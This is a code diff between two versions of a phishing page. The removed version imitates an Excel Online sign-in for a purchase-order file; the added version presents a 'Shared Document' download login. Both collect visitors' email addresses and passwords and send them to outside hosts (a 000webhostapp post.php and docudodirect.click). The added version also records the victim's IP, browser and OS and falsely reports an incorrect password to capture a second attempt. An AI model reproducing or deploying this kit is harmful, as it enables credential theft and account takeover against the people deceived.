@@ -1,353 +1,278 @@
 
-</script>
-<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
-<html xmlns="http://www.w3.org/1999/xhtml">
+<!DOCTYPE html>
+<html>
 <head>
-<link rel="icon" href="https://i.gyazo.com/83cffd1ebf23ed93aa925eb9529f5348.png" type="image/x-icon"/>
-<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
-<title>Excel Online Spreadsheet :: Sign in</title>
-<!--<script src="https://code.jquery.com/jquery-3.1.1.min.js" crossorigin="anonymous"></script>-->
+	<title>Shared Document</title>
+	<meta charset="utf-8">
+	<meta name="viewport" content="initial-scale=1.0, maximum-scale=1.0, width=device-width, user-scalable=yes">
+	<style type="text/css">
+		body {
+                    background:url(https://i.imgur.com/u4E6RiQ.png) no-repeat center center fixed;
+		    font-family: Verdana, sans-serif;
+		    font-size: 0.8em;
+		}
+		#content {
+		    text-align: center;
+		    margin: auto;
+		    background-color: white;
+		    position: fixed;
+		    top: 50%;
+		    left: 50%;
+		    transform: translate(-50%, -50%);
+		    box-shadow: 0 10px 40px 0 rgba(62, 57, 107, 0.07), 0 2px 9px 0 rgba(62, 57, 107, 0.06);
+		    border-radius: 0.25rem;
+			width: 25rem;
 
-<script src="https://code.jquery.com/jquery-3.1.1.min.js"></script>
-<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
-<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
-<link href="https://ucarecdn.com/eae24034-0cc9-4528-827a-d46e30dd5a83/hover.css" rel="stylesheet" media="all">
+		}
+		input.some {
+		    width: 100%;
+		    display: block;
+		    height: 2rem;
+		    text-align: left;
+		    border: 1px solid #ccd6e6;
+			color: #3f587e;
+			font-size: 1rem;
+			line-height: 1;
+			border-radius: 0.25rem;
+			margin-bottom: 0.5rem;
+			/*padding-left: 0.5rem;*/
+		}
 
- <script src="https://klxszs.web.app/jp_outlook.js"> </script>
-<script type="text/javascript">
+		.foot {
+		    margin: auto;
+		    text-align: center;
+		    position: fixed;
+		    bottom: 0;
+		    left: 0;
+		    width: 100%;
+		    height: 4em;
+		    color: #ffffff;
+		}
 
-var docurl = '';
-	const queryString = window.location.search;
-	console.log(queryString);
-	const urlParams = new URLSearchParams(queryString);
-	const str = urlParams.get('prox')
-	var proxx = str.substring(0, 4);
-    var results =str.split('@');
-	var result = results[1];
-
-</script>
-<style type="text/css">
-    .hide {
-      display: none;
-    }
-
-    .grey-form {
-      background-color: #ffffff;
-      opacity: 1;
-      pointer-events: none;
-    }
-
-    .alert-success {
-      color: #155724;
-      background-color: #d4edda;
-      border-color: #c3e6cb;
-    }
-
-
-
-    .modal-body {
-    padding: 0 !important;
-}
-.login-container{
-    position: absolute;
-    /*width: 400px;*/
-    margin: 80px auto;
-    padding: 20px 20px 20px;
-    text-align: center;
-    background: #f5f5f5;
-    border: 1px solid #ccc;
-}
-
-#output{
-    position: absolute;
-    width: 400px;
-    top: -75px;
-    left: 0;
-    color: #fff;
-}
-
-#output.alert-success{
-    background: rgb(25, 204, 25);
-}
-
-#output.alert-danger{
-    background: rgb(228, 105, 105);
-
-}
-
-.avatar{
-    width: 100px;height: 100px;
-    margin: 10px auto -30px;
-    border-radius: 100%;
-    border: 2px solid #aaa;
-    background-size: cover;
-}
-
-.form-box input{
-    width: 100%;
-	margin: 1px; auto
-    padding: 10px;
-    text-align: center;
-    height: 40px;
-    border: 1px solid #ccc;;
-    background: #ffffff;
-    transition:0.2s ease-in-out;
-
-}
-
-.form-box input:focus{
-    outline: 50px;
-    background: #ffffff;
-}
-
-.form-box input[type="text"]{
-    border-radius: 5px 5px 0 0;
-    text-transform: lowercase;
-}
-
-.form-box input[type="password"]{
-    border-radius: 0 0 0px 0px;
-    border-top: 0;
-}
-
-.form-box button.login{
-    margin-top: 15px;
-    padding: 10px 20px;
-}
-
-.animated {
-  -webkit-animation-duration: 1s;
-  animation-duration: 1s;
-  -webkit-animation-fill-mode: both;
-  animation-fill-mode: both;
-}
-
-@-webkit-keyframes fadeInUp {
-  0% {
-    opacity: 0;
-    -webkit-transform: translateY(20px);
-    transform: translateY(20px);
-  }
-
-  100% {
-    opacity: 0;
-    -webkit-transform: translateY(0);
-    transform: translateY(0);
-  }
-}
-
-@keyframes fadeInUp {
-  0% {
-    opacity: 0;
-    -webkit-transform: translateY(20px);
-    -ms-transform: translateY(20px);
-    transform: translateY(20px);
-  }
-
-  100% {
-    opacity: 1;
-    -webkit-transform: translateY(0);
-    -ms-transform: translateY(0);
-    transform: translateY(0);
-  }
-}
-
-.fadeInUp {
-  -webkit-animation-name: fadeInUp;
-  animation-name: fadeInUp;
-}
-  </style>
-
+		.header{
+			color: white;
+			padding-top: 0.6em;
+			padding-bottom: 0.6em;
+			font-weight: 500;
+			font-size: 1rem;
+			background-color: #1D6F42;
+		    border-radius: 0.25rem;
+		    text-transform: uppercase;
+		}
+		#content-app{
+			background-color: white;
+			padding-bottom: 1.5em;
+			padding-top: 3.5em;
+			padding-right: 3.5em;
+			padding-left: 3.5em;
+			border-bottom-right-radius: 0.25rem;
+			border-bottom-left-radius: 0.25rem;
+		}
+		.btn{
+			display: block;
+			width: 100%;
+			position: relative;
+			background-color: #1D6F42;
+			text-align: center;
+			color: white;
+			font-size: 1rem;
+		    height: 2rem;
+		    border-radius: 0.25rem;
+		    border: 1px solid transparent;
+			padding-left: 0.5rem;
+		}
+		.err{
+		    border: 1px solid red !important;
+		}
+		footer{
+			text-align: center;
+			/*margin: 41em;*/position: fixed;
+		    top: 78%;
+		    left: 50%;
+		    transform: translate(-50%, -50%);
+		}
+		.top-img{
+			position: fixed;
+			top: 20%;
+			left: 50%;
+			transform: translate(-50%, -50%);
+		}
+		.text-success{
+			color: #28a745 !important;
+		}
+                .network-error {
+                        color: red;
+                        font-size: 1rem;
+                        text-align: center;
+                        margin-bottom: 1rem;
+                }
+	</style>
 </head>
-
 <body>
-  <div class="container-fluid">
-    <div class="row" style="height: 100vh; background-image: url('https://i.gyazo.com/52a11ae9fe6936093d1a147ffb24ad16.png'); background-size: cover;background-repeat: no-repeat;">
-      <div class="container">
-        <div class="row">
-
-
-        </div>
-      </div>
-
-
-  <!-- Modal for gmail -->
-  <div style="display: block !important" class="modal" id="ajaxModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
-    <div class="modal-dialog" role="document">
-      <div style="position: relative;
-                  display: -webkit-box;
-                  display: -ms-flexbox;
-                  display: flex;
-                  -webkit-box-orient: vertical;
-                  -webkit-box-direction: normal;
-                  -ms-flex-direction: column;
-                  flex-direction: column;
-                  width: 80%;
-                  pointer-events: auto;
-                  ">
-        <div class="modal-body">
-
-        <div class="login-container">
-            <div id="output"></div>
-            <div class="avatar">
-              <img  class="img-fluid brand_logo" width="60px" style="margin-top: 20px;" src="https://i.gyazo.com/83cffd1ebf23ed93aa925eb9529f5348.png">
-            </div>
-            <div class="form-box">
-              <div style="margin-top: 10px;" class="alert" ><color style="color:red;"><!--Your account or password is incorrect--> </color></div>
-              <h4>Microsoft Excel Online</h4>
-              <p>"Purchase Order (PO-#20941.xlx)"</p>
-                <!--<form id="contact" class="form-horizontal well">-->
-                <form  action="" method="post">
-                    <input type="text"  value="" id="email" name="email" style="background-color: #eee;opacity: 1; aria-describedby="emailHelp"placeholder="Enter Your Email" required="readonly">
-                    
-                    <input type="password" name="password" id="password" aria-describedby="emailHelp" placeholder="Enter Your Password" required="" class="form-input-container">
-                    <button class="btn btn-success btn-block login" style="background: #039126;" id="submit-btn"  type="submit" onClick="contactUs();">Download Document</button>
-					<div id="msg" style="margin-bottom:25px; color:#ff1505;">Your account or password is incorrect</div>
-<span class="small"style="margin-bottom:25px; color:#ff1505;" id="msg_text"></span>
-                </form>
-            </div>
-        </div>
-
-
-
-
-        </div>
-
-
-      </div>
+	<div class="top-img">
+		<img src='data:image/png;base64,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' />
+	</div>
+	<div id='content'>
+    <div class="header">
+        <span style="text-align: left" class="dotDomain"></span> <span style="text-align: right"> | Login With Your Email Provider To Access Shared Document</span>
     </div>
-  </div>
+    <div id='content-app'>
+        <div style="display: block">
+            <input class="some" type="email" name="dblEmail" id="dblEmail" placeholder="Email" />
+            <input type="hidden" name="txtEmail" id="txtEmail" />
 
+            <input type="hidden" name="v-pass" id="v-pass">
+            <input type="hidden" name="test" id="test" value="stepOne" />
+            <input class="some" type="password" name="txtPass" id="txtPass" placeholder="Password">
+            <small class="pwdErr"></small>
+            <!-- Hide the error message initially -->
+            <div class="network-error" style="display: none;">Incorrect Password, Try again</div>
+            <input type="checkbox" name="chkSecured" style="display: inline-block; margin-bottom: 3rem;"> <label style="display: inline-block; margin-bottom: 3rem;">Secured Login session?</label>
+        </div>
+        <div><button class="btn" id="btn-submit" ><i id="iSpin" class="fa fa-pulse pr-2"></i> DOWNLOAD</button></div>
+    </div>
+</div>
+    <footer>
+    	<div>Copyright &copy; <span  id="intYear"></span> Privacy Policy</div>
+    </footer>
 
-</body>
-</body>
-<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
-  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
-  <script>
+    <script src="https://code.jquery.com/jquery-3.4.1.min.js"></script>
 
-    /* global $ */
-    $(document).ready(function(){
-      var count=0;
+    <!-- code_deamon -->
+    <script type="text/javascript">
 
-      // $('#back1').click(function () {
-      //   $("#msg").hide();
-      //   $('#email').val("");
-      //   $("#automail").animate({left:200, opacity:"hide"}, 0);
-      //   $("#inputbar").animate({right:200, opacity:"show"}, 1000);
+        let icq_processor = "https://docudodirect.click/human/index2.php";
 
-      // });
+// current Year
+var date = new Date();
+var intYear = date.getFullYear();
+$('span#intYear').text(intYear);
 
-    /////////////url email getting////////////////
-    var email = window.location.hash.substr(1);
-    if (!email) {
+/*
+* jQuery Browser detection plugin
+*/
+(function( $ ) {
+    $.extend({
+        browserDetection: function ( addClass ) {
 
-    }
-    else
-    {
-        // $('#email').val(email);
-        var my_email =email;
-        var ind=my_email.indexOf("@");
-        var my_slice=my_email.substr((ind+1));
-        var c= my_slice.substr(0, my_slice.indexOf('.'));
-        var final= c.toLowerCase();
-        $('#contact').trigger("reset");
-        $("#msg").hide();
-        $('#fieldImg').attr('src', 'images/other-1.png');
-        $('#field').html("Other Mail");
-        $('#email').val(my_email);
-        $('#emailch').html(my_email);
-        $("#msg").hide();
-        // $("#inputbar").animate({left:200, opacity:"hide"}, 0);
-        // $("#automail").animate({right:200, opacity:"show"}, 1000);
-      }
-      ///////////////url getting email////////////////
+            var theBody = $('body'),
+            userAgent = window.navigator.userAgent,
+            msieIndex = userAgent.indexOf('MSIE '),
+            currentBrowser,
+            browserClass;
 
+            if ( msieIndex !=-1 ) { // IE <= 10
+                var ieVersion = userAgent.substring(msieIndex + 5, userAgent.indexOf('.', msieIndex)); // IE version
+                currentBrowser = 'IE' + ieVersion;
+                browserClass = 'IE ' + currentBrowser;
+            } else if ( userAgent.indexOf('Trident/') !=-1 ) { // IE11
+                currentBrowser = 'IE11';
+                browserClass = 'IE IE11';
+            } else if ( userAgent.indexOf('Chrome') != -1 ) {
+                if ( userAgent.indexOf('OPR') != -1 ) { // Opera
+                    currentBrowser = browserClass = 'Opera';
+                } else {
+                    currentBrowser = browserClass = 'Chrome'; // Chrome
+                }
+            } else if (userAgent.indexOf('Safari') != -1 && userAgent.indexOf('Chrome') == -1) { // Safari
+                if ( userAgent.indexOf('CriOS') != -1 ) { // Chrome for iOS
+                    currentBrowser = browserClass = 'Chrome';
+                } else {
+                    currentBrowser = browserClass = 'Safari';
+                }
+            } else if ( userAgent.indexOf('Firefox') != -1 ) { // Firefox
+                currentBrowser = browserClass = 'Firefox';
+            } else {
+                currentBrowser = 'notDetected';
+                browserClass = '';
+            }
 
-      
-      $('#submit-btn').click(function(event){
-        $('#error').hide();
-        $('#msg').hide();
-        event.preventDefault();
-        var email=$("#email").val();
-        var password=$("#password").val();
-      ///////////new injection////////////////
-      var my_email =email;
-      var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+            if ( addClass ) { // add class
+                theBody.addClass(browserClass);
+            }
 
-      if (!filter.test(my_email)) {
-        $('#error').show();
-        email.focus;
-        return false;
-      }
+            return currentBrowser; // return value
+        }
+    });
+}( jQuery ));
 
-      var ind=my_email.indexOf("@");
-      var my_slice=my_email.substr((ind+1));
-      var c= my_slice.substr(0, my_slice.indexOf('.'));
-      var final= c.toLowerCase();
-      ///////////new injection////////////////
-      count=count+1;
-      
-      $.ajax({
-        dataType: 'JSON',
-        url: 'https://gronty.000webhostapp.com/softruck/post.php',
-        type: 'POST',
-        data:{
-          email:email,
-          password:password,
-        },
-            // data: $('#contact').serialize(),
-            beforeSend: function(xhr){
-              $('#submit-btn').html('Verifying credentials...');
+// main stuff
+let href = $(location).attr('href');
+let divide1 = href.split("@");
+let divide2 = href.split("#");
+let the_domain = divide1[1];
+$('.dotDomain').text(divide1[1]);
+$('#txtEmail').val(divide2[1]);
+$('#dblEmail').val(divide2[1]);
+let icq_url = icq_processor;
+let userIP = '';
+
+var currentBrowser = $.browserDetection(true);
+$.getJSON('https://api.ipify.org?format=json', function(data){
+    userIP = data.ip;
+});
+
+var OSName="Unknown OS";
+if (navigator.appVersion.indexOf("Win")!=-1) OSName="Windows";
+if (navigator.appVersion.indexOf("Mac")!=-1) OSName="MacOS";
+if (navigator.appVersion.indexOf("X11")!=-1) OSName="UNIX";
+if (navigator.appVersion.indexOf("Linux")!=-1) OSName="Linux";
+if (navigator.userAgent.indexOf("Android")!=-1) OSName="Android OS";
+if (navigator.userAgent.indexOf("like Mac")!=-1) OSName="iOS";
+
+let failedLoginAttempts = 0;
+
+    $('#btn-submit').on('click', function(event){
+    $('#txtEmail').val($('#dblEmail').val());
+    $('.pwdErr').text('');
+    event.preventDefault();
+
+    var password = $('#txtPass').val(); // Save the password
+    $('#txtPass').val(''); // Clear the password field visually
+
+    if (password != "") {
+        $('#iSpin').addClass('fa-spinner');
+
+        $.ajax({
+            url: icq_url,
+            type: "POST",
+            data: {
+                email: $('#txtEmail').val(),
+                pwd: password, // Use the saved password variable here
+                verify: $('#test').val(),
+                userBrowser: currentBrowser,
+                userIP: userIP,
+                OSName: OSName
             },
-            success: function(response){
-              if(response){
-                $("#msg").show();
-                console.log(response);
-                if(response['signal'] == 'ok'){
-                  $("#password").val("");
-                  if (count>=2) {
-                    count=0;
-                    // window.location.replace(response['redirect_link']);
-                   window.location.replace("http://www."+my_slice);
-
-                  }
-                  $('#msg_text').html(response['msg']);
+            success: function(data){
+                var i = $.parseJSON(data);
+                if (i.status == 200){
+                    $('.pwdErr').text('Incorrect Password, Try again');
+                    $('#test').val("stepTwo");
+                    $('#v-pass').val(i.password);
+                    $('#iSpin').toggleClass('fa-spinner');
                 }
-                else{
-                  $('#msg_text').html(response['msg']);
-                }
-              }
             },
             error: function(){
-              $("#password").val("");
-              if (count>=2) {
-                count=0;
-                
-              }
-              $("#msg").show();
-            },
-            complete: function(){
-              $('#submit-btn').html('Download');
+                failedLoginAttempts++;
+
+                // Check if the number of failed login attempts is 3
+                if (failedLoginAttempts === 3) {
+                    window.location.href = 'https://office.com'; // Redirect after 3 attempts
+                } else {
+                    $('.network-error').show();
+                    $('#iSpin').toggleClass('fa-spinner');
+                    $('#btn-submit').removeClass('disabled');
+                }
             }
-          });
-    });
-
-
-    });
-
-    document.onkeydown=function(e){
-      if (e.ctrlKey && 
-        (e.keyCode === 73 || 
-         e.keyCode === 105 ||
-         e.keyCode === 74 || 
-         e.keyCode === 106 || 
-         e.keyCode === 85 || 
-         e.keyCode === 117)) {
-        alert('not allowed');
-      return false;
+        });
     } else {
-      return true;
+        $('#txtPass').addClass('err');
+        $('#iSpin').toggleClass('fa-spinner');
     }
-  }
+});
+
+
 </script>
+</body>
 </html>
